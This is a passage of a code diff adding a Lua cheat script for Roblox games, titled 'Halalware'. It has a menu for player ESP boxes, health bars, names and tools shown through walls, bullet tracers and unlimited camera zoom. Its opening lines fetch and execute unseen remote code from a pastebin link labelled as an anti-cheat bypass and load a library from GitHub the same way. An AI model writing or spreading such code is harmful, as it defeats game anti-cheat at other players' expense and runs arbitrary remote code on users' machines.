@@ -1,0 +1,2806 @@
+wait(3)
+loadstring(game:HttpGet('https://pastebin.com/raw/gimbTwW1'))() -- ac bypass dont touch
+local S = {
+    PS = game:GetService('Players'), RS = game:GetService('RunService'), WS = game:GetService('Workspace'),
+    UIS = game:GetService('UserInputService'), TS = game:GetService('TweenService'), LS = game:GetService('Lighting'),
+    CG = game:GetService('CoreGui'), SG = game:GetService('StarterGui'), SP = game:GetService('StarterPack'),
+    SR = game:GetService('StarterPlayer'), RP = game:GetService('ReplicatedStorage'), RF = game:GetService('ReplicatedFirst'),
+    SS = game:GetService('SoundService'), TV = game:GetService('TeleportService'), BS = game:GetService('BadgeService'),
+    PL = game:GetService('PolicyService'), PF = game:GetService('PathfindingService'), DS = game:GetService('DataStoreService'),
+    CH = game:GetService('Chat'), MSG = game:GetService('MessagingService'), FS = game:GetService('FriendService'),
+    INS = game:GetService('InsertService'), TM = game:GetService('Teams'), SGv = game:GetService('StarterGear'),
+    VR = game:GetService('VRService'), GU = game:GetService('GuiService'), TScr = game:GetService('TextService'),
+    DB = game:GetService('Debris'), PH = game:GetService('PhysicsService'), LOC = game:GetService('LocalizationService'),
+    TST = game:GetService('TestService'), VS = game:GetService('VoiceChatService'), NS = game:GetService('NotificationService'),
+    HS = game:GetService('HttpService'), CS = game:GetService('CollectionService'), CP = game:GetService('ContentProvider'),
+    PPS = game:GetService('ProximityPromptService'), TCS = game:GetService('TextChatService'), ES = game:GetService('ExperienceService'),
+    PSS = game:GetService('PointsService'), GS = game:GetService('GroupService'), MS = game:GetService('MarketplaceService'),
+}
+
+local M = {
+    abs = math.abs, floor = math.floor, ceil = math.ceil, sqrt = math.sqrt, clamp = math.clamp,
+    min = math.min, max = math.max, atan2 = math.atan2, acos = math.acos, asin = math.asin,
+    cos = math.cos, sin = math.sin, tan = math.tan, rad = math.rad, deg = math.deg, random = math.random
+}
+
+local T = {
+    insert = table.insert, remove = table.remove, sort = table.sort, find = table.find, concat = table.concat
+}
+
+local STR = {
+    sub = string.sub, gsub = string.gsub, lower = string.lower, upper = string.upper,
+    rep = string.rep, split = string.split, fmt = string.format
+}
+
+local V3, V2, CF, C3, U2, RP = Vector3, Vector2, CFrame, Color3, UDim2, RaycastParams
+local RND, SND, HRT = S.RS.RenderStepped, S.RS.Stepped, S.RS.Heartbeat
+local LP = S.PS.LocalPlayer
+local Char = LP.Character or LP.CharacterAdded:Wait()
+local Body = {
+    Hum = Char:FindFirstChildOfClass('Humanoid'),
+    HRP = Char:FindFirstChild('HumanoidRootPart'),
+    Head = Char:FindFirstChild('Head'),
+    Tor = Char:FindFirstChild('Torso') or Char:FindFirstChild('UpperTorso'),
+    LA = Char:FindFirstChild('Left Arm') or Char:FindFirstChild('LeftUpperArm'),
+    RA = Char:FindFirstChild('Right Arm') or Char:FindFirstChild('RightUpperArm'),
+    LL = Char:FindFirstChild('Left Leg') or Char:FindFirstChild('LeftUpperLeg'),
+    RL = Char:FindFirstChild('Right Leg') or Char:FindFirstChild('RightUpperLeg'),
+}
+
+local Cam, Mse, Bp, Tm, UID, PGui = S.WS.CurrentCamera, LP:GetMouse(), LP:FindFirstChildOfClass('Backpack'), LP.Team, LP.UserId, LP:FindFirstChildOfClass('PlayerGui')
+
+local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'
+local Library = loadstring(game:HttpGet('https://raw.githubusercontent.com/ZXCdswqezxc/halalware/refs/heads/main/library'))()
+local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
+local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
+
+local Window = Library:CreateWindow({
+    Title = 'Halalware',
+    Center = true,
+    AutoShow = true,
+    TabPadding = 8,
+    MenuFadeTime = 0.2
+})
+
+local Tabs = {
+    Combat = Window:AddTab('Combat'),
+    Misc = Window:AddTab('Misc'),
+    Visuals = Window:AddTab('Visuals'),
+    Player = Window:AddTab('Player'),
+    Config = Window:AddTab('Config'),
+}
+
+ThemeManager:SetLibrary(Library)
+SaveManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+local MenuGroup = Tabs.Config:AddLeftGroupbox('Menu')
+MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', {
+    Default = 'None',
+    NoUI = true,
+    Text = 'Menu',
+})
+Library.ToggleKeybind = Options.MenuKeybind
+ThemeManager:ApplyToTab(Tabs.Config)
+SaveManager:BuildConfigSection(Tabs.Config)
+SaveManager:LoadAutoloadConfig()
+
+-- === HUD Section in Config ===
+local HUDGroup = Tabs.Config:AddRightGroupbox('HUD')
+HUDGroup:AddToggle('ShowWatermark', {
+    Text = 'Watermark',
+    Default = false,
+    Callback = function(v)
+        if v then
+            local name = LP and LP.Name or 'Player'
+            Library:SetWatermark('halalware.skid | ' .. name)
+        else
+            Library:SetWatermark('')
+        end
+    end
+})
+HUDGroup:AddToggle('ShowKeybinds', {
+    Text = 'Keybinds',
+    Default = false,
+    Callback = function(v)
+        if Library.KeybindFrame then
+            Library.KeybindFrame.Visible = v
+        end
+    end
+})
+
+local ESPConfig = {
+    Enabled = false,
+    MaxDistance = 200,
+    Box = {
+        Enable = false, -- выключено по умолчанию
+        Type = 'Full',
+        Font = 'ProggyClean',
+        Color = Color3.fromRGB(255, 255, 255),
+        Filled = {
+            Enable = false,
+            Gradient = {
+                Enable = false,
+                Color = {
+                    Start = Color3.fromRGB(255, 255, 255),
+                    End = Color3.fromRGB(255, 255, 255),
+                },
+                Rotation = {
+                    Enable = false,
+                    Auto = true,
+                },
+                Transparency = 0.3,
+            }
+        }
+    },
+    Text = {
+        Enable = false,
+        Name = {
+            Enable = false,
+            Teamcheck = true,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+        Studs = {
+            Enable = false,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+        Tool = {
+            Enable = false,
+            Color = Color3.fromRGB(255, 255, 255),
+        },
+    },
+    Bars = {
+        Enable = false,
+        Health = {
+            ShowOutline = false,
+            Enable = false,
+            Lerp = true,
+            Color1 = Color3.fromRGB(255, 255, 255)
+        }
+    }
+}
+
+local ESPGroup = Tabs.Visuals:AddLeftGroupbox('>_<')
+ESPGroup:AddToggle('ESPEnabled', {
+    Text = 'ESP',
+    Default = false,
+    Callback = function(v) ESPConfig.Enabled = v end
+})
+ESPGroup:AddSlider('ESPMaxDist', {
+    Text = 'Max Distance',
+    Min = 50, Max = 10000, Default = ESPConfig.MaxDistance,
+    Rounding = 0,
+    Callback = function(v) ESPConfig.MaxDistance = v end
+})
+ESPGroup:AddToggle('ESPBox', {
+    Text = 'Box',
+    Default = false,
+    Callback = function(v) ESPConfig.Box.Enable = v end
+}):AddColorPicker('ESPBoxColor', {
+    Default = ESPConfig.Box.Color,
+    Callback = function(v) ESPConfig.Box.Color = v end
+})
+ESPGroup:AddToggle('ESPBoxFilled', {
+    Text = 'Filled',
+    Default = false,
+    Callback = function(v) ESPConfig.Box.Filled.Enable = v end
+}):AddColorPicker('ESPBoxGradStart', {
+    Default = ESPConfig.Box.Filled.Gradient.Color.Start,
+    Callback = function(v) ESPConfig.Box.Filled.Gradient.Color.Start = v end
+}):AddColorPicker('ESPBoxGradEnd', {
+    Default = ESPConfig.Box.Filled.Gradient.Color.End,
+    Callback = function(v) ESPConfig.Box.Filled.Gradient.Color.End = v end
+})
+ESPGroup:AddToggle('ESPBoxGradient', {
+    Text = 'Gradient Anim',
+    Default = false,
+    Callback = function(v) ESPConfig.Box.Filled.Gradient.Enable = v end
+})
+ESPGroup:AddSlider('ESPBoxGradTrans', {
+    Text = 'Grad Transp',
+    Min = 0, Max = 1, Default = ESPConfig.Box.Filled.Gradient.Transparency, Rounding = 2,
+    Callback = function(v) ESPConfig.Box.Filled.Gradient.Transparency = v end
+})
+ESPGroup:AddToggle('ESPText', {
+    Text = 'Text',
+    Default = false,
+    Callback = function(v) ESPConfig.Text.Enable = v end
+})
+ESPGroup:AddToggle('ESPName', {
+    Text = 'Name',
+    Default = false,
+    Callback = function(v) ESPConfig.Text.Name.Enable = v end
+}):AddColorPicker('ESPNameColor', {
+    Default = ESPConfig.Text.Name.Color,
+    Callback = function(v) ESPConfig.Text.Name.Color = v end
+})
+ESPGroup:AddToggle('ESPStuds', {
+    Text = 'Studs',
+    Default = false,
+    Callback = function(v) ESPConfig.Text.Studs.Enable = v end
+}):AddColorPicker('ESPStudsColor', {
+    Default = ESPConfig.Text.Studs.Color,
+    Callback = function(v) ESPConfig.Text.Studs.Color = v end
+})
+ESPGroup:AddToggle('ESPTool', {
+    Text = 'Tool',
+    Default = false,
+    Callback = function(v) ESPConfig.Text.Tool.Enable = v end
+}):AddColorPicker('ESPToolColor', {
+    Default = ESPConfig.Text.Tool.Color,
+    Callback = function(v) ESPConfig.Text.Tool.Color = v end
+})
+ESPGroup:AddToggle('ESPHealthbar', {
+    Text = 'Healthbar',
+    Default = false,
+    Callback = function(v) ESPConfig.Bars.Health.Enable = v end
+}):AddColorPicker('ESPHealthbarColor', {
+    Default = ESPConfig.Bars.Health.Color1,
+    Callback = function(v) ESPConfig.Bars.Health.Color1 = v end
+})
+
+-- === Bullet Tracers UI (ENGLISH, SHORT) ===
+local BulletTracersGroup = Tabs.Visuals:AddRightGroupbox('>_<')
+
+local BulletTracersConfig = {
+    Enabled = false,
+    Color1 = C3.new(1,1,1),
+    Color2 = C3.new(1,1,1),
+    Thickness = 1,
+    Texture = "rbxassetid://446111271"
+}
+local BulletTextures = {
+    ["Starhook"] = "rbxassetid://446111271",
+    ["Chain"] = "rbxassetid://3029306948",
+    ["Lightning"] = "rbxassetid://7216850022",
+    ["Beam"] = "rbxassetid://1263079249"
+}
+
+local BulletToggle = BulletTracersGroup:AddToggle('BulletTracersEnabled', {
+    Text = 'Tracer',
+    Default = false,
+    Callback = function(v) BulletTracersConfig.Enabled = v end
+})
+BulletToggle:AddColorPicker('BulletTracersColor1', {
+    Default = BulletTracersConfig.Color1,
+    Title = 'C1',
+    Callback = function(val) BulletTracersConfig.Color1 = val end
+})
+BulletToggle:AddColorPicker('BulletTracersColor2', {
+    Default = BulletTracersConfig.Color2,
+    Title = 'C2',
+    Callback = function(val) BulletTracersConfig.Color2 = val end
+})
+BulletTracersGroup:AddSlider('BulletTracersThickness', {
+    Text = 'Thick',
+    Default = BulletTracersConfig.Thickness,
+    Min = 0.1, Max = 10, Rounding = 1,
+    Callback = function(val) BulletTracersConfig.Thickness = val end
+})
+BulletTracersGroup:AddDropdown('BulletTracersTexture', {
+    Text = 'Tex',
+    Values = {"Starhook", "Chain", "Lightning", "Beam"},
+    Default = 'Starhook',
+    Callback = function(val) BulletTracersConfig.Texture = BulletTextures[val] end
+})
+
+-- === Bullet Tracers Logic (ONLY) ===
+local gS = { t = nil, a = 0, s = false, c = {} }
+local gM = {
+    [2788229376] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored.Siren.Radius" },
+    [71189885129233] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored" },
+    [5602055394] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored" },
+    [17403265390] = { BN = "Part", BBN = "gb", BP = "" },
+    [17403166075] = { BN = "Part", BBN = "gb", BP = "" },
+    [18111448661] = { BN = "Part", BBN = "gb", BP = "" },
+    [15186202290] = { BN = "Part", BBN = "gb", BP = "" },
+    [11143225577] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "" },
+    [15763494605] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "" },
+    [15166543806] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "" },
+    [17897702920] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "" },
+    [16033173781] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored.Siren.Radius" },
+    [7213786345] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored.Siren.Radius" },
+    [9825515356] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored" },
+    [16859411452] = { BN = "bulletray", BBN = "beam", BP = "Ignored" },
+    [14277620939] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored" },
+    [0] = { BN = "BULLET_RAYS", BBN = "GunBeam", BP = "Ignored" }
+}
+local function gP(r, p)
+    if p == "" then return r end
+    local ps = STR.split(p, ".")
+    local c = r
+    for _, pt in ipairs(ps) do
+        c = c:FindFirstChild(pt)
+        if not c then return nil end
+    end
+    return c
+end
+local function dG()
+    local d = gM[game.PlaceId] or gM[0]
+    d.BP = gP(S.WS, d.BP) or S.WS
+    return d
+end
+local function cB(f, t, c1, c2, thickness, texture)
+    local p = Instance.new("Part")
+    p.Name = "BT"
+    p.Parent = S.WS
+    p.Size = V3.zero
+    p.Massless = true
+    p.Transparency = 1
+    p.CanCollide = false
+    p.Position = f
+    p.Anchored = true
+    local p0, p1 = Instance.new("Part"), Instance.new("Part")
+    for _, pt in ipairs({p0, p1}) do
+        pt.Parent = p
+        pt.Size = V3.zero
+        pt.Massless = true
+        pt.Transparency = 1
+        pt.CanCollide = false
+        pt.Anchored = true
+    end
+    p0.Position = f
+    p1.Position = t
+    local a0, a1 = Instance.new("Attachment", p0), Instance.new("Attachment", p1)
+    local b = Instance.new("Beam")
+    b.Texture = texture
+    b.TextureMode = Enum.TextureMode.Wrap
+    b.TextureLength = 10
+    b.LightEmission = 1
+    b.LightInfluence = 1
+    b.FaceCamera = true
+    b.ZOffset = -1
+    b.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0), NumberSequenceKeypoint.new(1, 1)})
+    b.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, c1), ColorSequenceKeypoint.new(1, c2)})
+    b.Attachment0 = a0
+    b.Attachment1 = a1
+    b.Enabled = true
+    b.Width0 = thickness
+    b.Width1 = thickness
+    b.Parent = p
+    task.delay(1, function() p:Destroy() end)
+end
+local function gG(p)
+    if not p.Character then return end
+    local t = p.Character:FindFirstChildWhichIsA("Tool")
+    if not t then return end
+    for _, o in ipairs(t:GetDescendants()) do
+        if STR.lower(o.Name):find("ammo") and not STR.lower(o.Name):find("max") and o.ClassName:match("Value$") then
+            return { a = o, t = t }
+        end
+    end
+end
+local function sGT(p)
+    for _, cn in ipairs(gS.c) do cn:Disconnect() end
+    gS.c = {}
+    if not p.Character then
+        table.insert(gS.c, p.CharacterAdded:Connect(function() sGT(p) end))
+        return
+    end
+    local function oG(c, ia)
+        if not c:IsA("Tool") then return end
+        if ia then
+            local g = gG(p)
+            if g then
+                gS.t = g.t
+                gS.a = g.a.Value
+                table.insert(gS.c, g.a.Changed:Connect(function(na)
+                    if na < gS.a then
+                        gS.s = true
+                        task.wait()
+                        gS.s = false
+                    end
+                    gS.a = na
+                end))
+            end
+        else
+            if c == gS.t then gS.t, gS.a = nil, 0 end
+        end
+    end
+    table.insert(gS.c, p.Character.ChildAdded:Connect(function(c) oG(c, true) end))
+    table.insert(gS.c, p.Character.ChildRemoved:Connect(function(c) oG(c, false) end))
+    local g = gG(p)
+    if g then oG(g.t, true) end
+end
+local function sE()
+    local g = dG()
+    if not g.BP then return end
+    sGT(LP)
+    if not LP.Character then LP.CharacterAdded:Connect(function() sGT(LP) end) end
+    g.BP.ChildAdded:Connect(function(o)
+        if not gS.s then return end
+        if BulletTracersConfig.Enabled and o.Name == g.BN then
+            local b = o:WaitForChild(g.BBN, 1)
+            if not b then return end
+            local sp, ep = o.Position, b.Attachment1.WorldPosition
+            b:Destroy()
+            cB(
+                sp, ep,
+                BulletTracersConfig.Color1,
+                BulletTracersConfig.Color2,
+                BulletTracersConfig.Thickness,
+                BulletTracersConfig.Texture
+            )
+        end
+    end)
+end
+sE()
+
+local ESPCache, ESPConnections = {}, {}
+local gui_inset = S.GU:GetGuiInset()
+
+local function make_text(parent, font)
+    local d = Instance.new("TextLabel")
+    d.Parent = parent
+    d.Size = U2.new(0, 4, 0, 4)
+    d.BackgroundTransparency = 1
+    d.TextColor3 = Color3.fromRGB(255,255,255)
+    d.TextStrokeTransparency = 0
+    d.TextScaled = false
+    d.TextSize = 10
+    d.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+    d.Font = font or Enum.Font.SourceSans
+    return d
+end
+
+local function clear_esp(player)
+    local cache = ESPCache[player]
+    if not cache then return end
+    if cache.Box and cache.Box.Full then
+        cache.Box.Full.Square.Visible = false
+        cache.Box.Full.Outline.Visible = false
+        cache.Box.Full.Inline.Visible = false
+        if cache.Box.Full.Filled then
+            cache.Box.Full.Filled.Visible = false
+        end
+    end
+    if cache.Text then
+        if cache.Text.Studs then cache.Text.Studs.Visible = false end
+        if cache.Text.Tool then cache.Text.Tool.Visible = false end
+        if cache.Text.Name then cache.Text.Name.Visible = false end
+    end
+    if cache.Bars then
+        if cache.Bars.Health and cache.Bars.Health.Frame then
+            cache.Bars.Health.Frame.Visible = false
+            cache.Bars.Health.Outline.Visible = false
+        end
+    end
+end
+
+local function render_esp(player)
+    if not player then return end
+    ESPCache[player] = ESPCache[player] or {}
+    local cache = ESPCache[player]
+    cache.Box = cache.Box or {}
+    cache.Bars = cache.Bars or {}
+    cache.Text = cache.Text or {}
+    cache.Box.Full = cache.Box.Full or {
+        Square = Drawing.new("Square"),
+        Inline = Drawing.new("Square"),
+        Outline = Drawing.new("Square"),
+        Filled = Instance.new('Frame', Instance.new('ScreenGui', S.CG))
+    }
+    local Studs = Instance.new("ScreenGui")
+    Studs.Parent = S.CG
+    local Name = Instance.new("ScreenGui")
+    Name.Parent = S.CG
+    local Tool = Instance.new("ScreenGui")
+    Tool.Parent = S.CG
+    cache.Text.Studs = make_text(Studs)
+    cache.Text.Tool = make_text(Tool)
+    cache.Text.Name = make_text(Name)
+    local healthGui = Instance.new("ScreenGui")
+    healthGui.Name = player.Name .. "_HealthBar"
+    healthGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    healthGui.Parent = S.CG
+    local healthOutline = Instance.new("Frame")
+    healthOutline.BackgroundColor3 = Color3.new(0, 0, 0)
+    healthOutline.BorderSizePixel = 0
+    healthOutline.Name = "Outline"
+    healthOutline.Parent = healthGui
+    local healthFill = Instance.new("Frame")
+    healthFill.BackgroundTransparency = 0
+    healthFill.BorderSizePixel = 0
+    healthFill.Name = "Fill"
+    healthFill.Parent = healthOutline
+    healthFill.BackgroundColor3 = ESPConfig.Bars.Health.Color1
+    cache.Bars.Health = {
+        Gui = healthGui,
+        Outline = healthOutline,
+        Frame = healthFill
+    }
+end
+
+local function update_esp(player)
+    if not player or not ESPCache[player] then return end
+    local character = player.Character
+    if not character or not LP.Character then return end
+    local rootPart = character:FindFirstChild("HumanoidRootPart")
+    local client_root_part = LP.Character:FindFirstChild("HumanoidRootPart")
+    local humanoid = character:FindFirstChildWhichIsA("Humanoid")
+    if not rootPart or not humanoid or not client_root_part then 
+        clear_esp(player)
+        return 
+    end
+    if (client_root_part.Position - rootPart.Position).Magnitude > ESPConfig.MaxDistance or not ESPConfig.Enabled then
+        clear_esp(player)
+        return
+    end
+    local hrp2D, onScreen = S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position)
+    local charSize = (S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position - V3.new(0, 1, 0)).Y - S.WS.CurrentCamera:WorldToViewportPoint(rootPart.Position + V3.new(0, 3, 0)).Y) / 2
+    local size = V2.new(M.floor(charSize * 1.5), M.floor(charSize * 3.2)) 
+    local position = V2.new(M.floor(hrp2D.X - charSize * 1.5 / 2), M.floor(hrp2D.Y - charSize * 3 / 2))
+    local cache = ESPCache[player]
+    if not onScreen then
+        clear_esp(player)
+        return
+    end
+    if ESPConfig.Box.Enable then
+        if ESPConfig.Box.Type == "Full" then
+            cache.Box.Full.Square.Visible = true
+            cache.Box.Full.Square.Position = position
+            cache.Box.Full.Square.Size = size
+            cache.Box.Full.Square.Color = ESPConfig.Box.Color
+            cache.Box.Full.Square.Thickness = 2
+            cache.Box.Full.Square.Filled = false
+            cache.Box.Full.Square.ZIndex = 9e9
+            cache.Box.Full.Outline.Visible = true
+            cache.Box.Full.Outline.Position = position - V2.new(1, 1)
+            cache.Box.Full.Outline.Size = size + V2.new(2, 2)
+            cache.Box.Full.Outline.Color = Color3.new(0, 0, 0)
+            cache.Box.Full.Outline.Thickness = 1
+            cache.Box.Full.Inline.Visible = true
+            cache.Box.Full.Inline.Position = position + V2.new(1, 1)
+            cache.Box.Full.Inline.Size = size - V2.new(2, 2)
+            cache.Box.Full.Inline.Color = Color3.new(0, 0, 0)
+            cache.Box.Full.Inline.Thickness = 1
+            cache.Box.Full.Inline.Filled = false
+            if ESPConfig.Box.Filled.Enable and cache.Box.Full.Filled then
+                cache.Box.Full.Filled.Position = U2.new(0, position.X, 0, position.Y - S.GU:GetGuiInset().Y)
+                cache.Box.Full.Filled.Size = U2.new(0, size.X, 0, size.Y)
+                cache.Box.Full.Filled.BackgroundTransparency = ESPConfig.Box.Filled.Gradient.Transparency or 0.5
+                cache.Box.Full.Filled.BackgroundColor3 = Color3.new(1, 1, 1)
+                cache.Box.Full.Filled.Visible = true
+                cache.Box.Full.Filled.ZIndex = -9e9
+                local gradient = cache.Box.Full.Filled:FindFirstChild("Gradient") or Instance.new("UIGradient")
+                gradient.Name = "Gradient"
+                gradient.Color = ColorSequence.new({
+                    ColorSequenceKeypoint.new(0, ESPConfig.Box.Filled.Gradient.Color.Start),
+                    ColorSequenceKeypoint.new(1, ESPConfig.Box.Filled.Gradient.Color.End)
+                })
+                if ESPConfig.Box.Filled.Gradient.Enable then
+                    gradient.Rotation = math.sin(tick() * 2) * 180
+                else
+                    gradient.Rotation = 0
+                end
+                if not gradient.Parent then gradient.Parent = cache.Box.Full.Filled end
+            elseif cache.Box.Full.Filled then
+                cache.Box.Full.Filled.Visible = false
+            end
+        else
+            cache.Box.Full.Square.Visible = false
+            cache.Box.Full.Outline.Visible = false
+            cache.Box.Full.Inline.Visible = false
+            if cache.Box.Full.Filled then cache.Box.Full.Filled.Visible = false end
+        end
+    else
+        cache.Box.Full.Square.Visible = false
+        cache.Box.Full.Outline.Visible = false
+        cache.Box.Full.Inline.Visible = false
+        if cache.Box.Full.Filled then cache.Box.Full.Filled.Visible = false end
+    end
+    if ESPConfig.Bars.Health.Enable and humanoid then
+        local targetHealth = M.clamp(humanoid.Health / humanoid.MaxHealth, 0, 1)
+        local lastHealth = cache.Bars.Health.LastHealth or targetHealth
+        local lerpedHealth = lastHealth + (targetHealth - lastHealth) * 0.05
+        cache.Bars.Health.LastHealth = lerpedHealth
+        local x = position.X - 7
+        if cache.Bars.Health.Outline and cache.Bars.Health.Frame then
+            cache.Bars.Health.Outline.Visible = true
+            cache.Bars.Health.Outline.Position = U2.new(0, x - 1, 0, position.Y - S.GU:GetGuiInset().Y - 1)
+            cache.Bars.Health.Outline.Size = U2.new(0, 5, 0, size.Y + 1.1)
+            cache.Bars.Health.Outline.BackgroundTransparency = 0.2
+            cache.Bars.Health.Frame.Visible = true
+            cache.Bars.Health.Frame.Position = U2.new(0, 1, 0, (1 - lerpedHealth) * size.Y + 1)
+            cache.Bars.Health.Frame.Size = U2.new(0, 3, 0, lerpedHealth * size.Y)
+            cache.Bars.Health.Frame.BackgroundColor3 = ESPConfig.Bars.Health.Color1
+        end
+    else
+        if cache.Bars.Health.Outline then cache.Bars.Health.Outline.Visible = false end
+        if cache.Bars.Health.Frame then cache.Bars.Health.Frame.Visible = false end
+    end
+    if ESPConfig.Text.Enable then
+        if cache.Text.Name then
+            cache.Text.Name.Visible = ESPConfig.Text.Name.Enable
+            if ESPConfig.Text.Name.Enable then
+                cache.Text.Name.Position = U2.new(0, position.X + (size.X / 2) - (cache.Text.Name.AbsoluteSize.X / 2), 0, position.Y - S.GU:GetGuiInset().Y - 9)
+                cache.Text.Name.Text = player.Name
+                cache.Text.Name.TextColor3 = ESPConfig.Text.Name.Color
+            end
+        end
+        if cache.Text.Tool then
+            cache.Text.Tool.Visible = ESPConfig.Text.Tool.Enable
+            if ESPConfig.Text.Tool.Enable then
+                cache.Text.Tool.Position = U2.new(0, position.X + (size.X / 2) - (cache.Text.Tool.AbsoluteSize.X / 2), 0, position.Y - S.GU:GetGuiInset().Y + size.Y + 15)
+                local tool = character:FindFirstChildOfClass("Tool")
+                cache.Text.Tool.Text = tool and tool.Name or "none"
+                cache.Text.Tool.TextColor3 = ESPConfig.Text.Tool.Color
+            end
+        end
+        if cache.Text.Studs then
+            cache.Text.Studs.Visible = ESPConfig.Text.Studs.Enable
+            if ESPConfig.Text.Studs.Enable then
+                cache.Text.Studs.Position = U2.new(0, position.X + (size.X / 2) - (cache.Text.Studs.AbsoluteSize.X / 2), 0, position.Y - S.GU:GetGuiInset().Y + size.Y + 5)
+                local meters = (S.WS.CurrentCamera.CFrame.Position - rootPart.Position).Magnitude * 0.28
+                cache.Text.Studs.Text = STR.fmt("[%.0fm]", meters)
+                cache.Text.Studs.TextColor3 = ESPConfig.Text.Studs.Color
+            end
+        end
+    else
+        if cache.Text.Name then cache.Text.Name.Visible = false end
+        if cache.Text.Tool then cache.Text.Tool.Visible = false end
+        if cache.Text.Studs then cache.Text.Studs.Visible = false end
+    end
+end
+
+for _, player in ipairs(S.PS:GetPlayers()) do
+    if player ~= LP then
+        render_esp(player)
+    end
+end
+S.PS.PlayerAdded:Connect(function(player)
+    if player ~= LP then
+        render_esp(player)
+    end
+end)
+S.PS.PlayerRemoving:Connect(function(player)
+    if player ~= LP then
+        clear_esp(player)
+    end
+end)
+
+if ESPConnections.Heartbeat then ESPConnections.Heartbeat:Disconnect() end
+ESPConnections.Heartbeat = HRT:Connect(function()
+    for v, _ in pairs(ESPCache) do
+        if v then
+            update_esp(v)
+        end
+    end
+end)
+
+local NameESPGroup = Tabs.Visuals:AddRightGroupbox('>_<')
+local ShowNameMethodConfig = {
+    Mode = 'Display',
+}
+
+NameESPGroup:AddDropdown('ShowNameMethod', {
+    Values = {'Display', 'Default', 'None'},
+    Default = 'Display',
+    Multi = false,
+    Text = 'ShowNameMethod',
+    Callback = function(v) ShowNameMethodConfig.Mode = v end
+})
+
+local function UpdateShowNameMethod(player)
+    if player == LP then return end
+    local char = player.Character
+    if not char then return end
+    local hum = char:FindFirstChildOfClass('Humanoid')
+    if not hum then return end
+    if ShowNameMethodConfig.Mode == 'None' then
+        hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+        return
+    end
+    hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer
+    hum.NameOcclusion = Enum.NameOcclusion.NoOcclusion
+    hum.DisplayName = (ShowNameMethodConfig.Mode == 'Display' and player.DisplayName ~= '' and player.DisplayName) or player.Name
+end
+
+local function UpdateAllShowNameMethod()
+    for _, p in ipairs(S.PS:GetPlayers()) do
+        UpdateShowNameMethod(p)
+    end
+end
+
+S.PS.PlayerAdded:Connect(function(p)
+    p.CharacterAdded:Connect(function() UpdateShowNameMethod(p) end)
+end)
+for _, p in ipairs(S.PS:GetPlayers()) do
+    if p.Character then UpdateShowNameMethod(p) end
+    p.CharacterAdded:Connect(function() UpdateShowNameMethod(p) end)
+end
+HRT:Connect(UpdateAllShowNameMethod)
+
+-- Unlock Camera Distance (Misc)
+local originalPlayerMaxZoom = LP.CameraMaxZoomDistance
+
+local MiscCameraGroup = Tabs.Misc:AddLeftGroupbox('>_<')
+MiscCameraGroup:AddToggle('UnlockCameraDistance', {
+    Text = 'Unlock Camera Distance',
+    Default = false,
+    Callback = function(v)
+        if v then
+            LP.CameraMaxZoomDistance = math.huge
+        else
+            LP.CameraMaxZoomDistance = originalPlayerMaxZoom
+        end
+    end,
+    Tooltip = 'Removes camera zoom limit'
+})
+
+-- SphereAura UI и логика
+local SphereAuraSettings = {
+    enabled = false,
+    color1 = Color3.new(1, 1, 1),
+    color2 = Color3.new(1, 1, 1),
+    size = 10,
+    lightEmission = 1
+}
+local currentAura
+
+local function updateAura(prop)
+    if not (currentAura and currentAura.Parent) then return end
+    local swirl = currentAura:FindFirstChild("Attachment"):FindFirstChild("swirl")
+    if not swirl then return end
+    if prop == "color" or prop == nil then
+        swirl.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, SphereAuraSettings.color1), ColorSequenceKeypoint.new(1, SphereAuraSettings.color2)})
+    end
+    if prop == "size" or prop == nil then
+        swirl.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, SphereAuraSettings.size), NumberSequenceKeypoint.new(1, SphereAuraSettings.size)})
+    end
+    if prop == "light" or prop == nil then
+        swirl.LightEmission = SphereAuraSettings.lightEmission
+    end
+end
+
+local function removePlayerAura()
+    if currentAura and currentAura.Parent then currentAura:Destroy() end
+    currentAura = nil
+end
+
+local function createPlayerAura(character)
+    removePlayerAura()
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart") or character:WaitForChild("HumanoidRootPart", 3)
+    if not humanoidRootPart then return end
+    local auraBase = Instance.new("Part")
+    auraBase.Size, auraBase.Transparency, auraBase.Anchored, auraBase.CanCollide, auraBase.Name, auraBase.Parent = Vector3.new(1, 1, 1), 1, false, false, "AuraBase", S.WS
+    local weld = Instance.new("Weld")
+    weld.Part0, weld.Part1, weld.C0, weld.Parent = humanoidRootPart, auraBase, CFrame.new(0, 0, 0), auraBase
+    local attachment = Instance.new("Attachment")
+    attachment.Parent = auraBase
+    local swirlEmitter = Instance.new("ParticleEmitter")
+    swirlEmitter.Name, swirlEmitter.Texture, swirlEmitter.Lifetime, swirlEmitter.Rate, swirlEmitter.RotSpeed, swirlEmitter.Speed = "swirl", "rbxassetid://10558425570", NumberRange.new(2), 150, NumberRange.new(200), NumberRange.new(0.01)
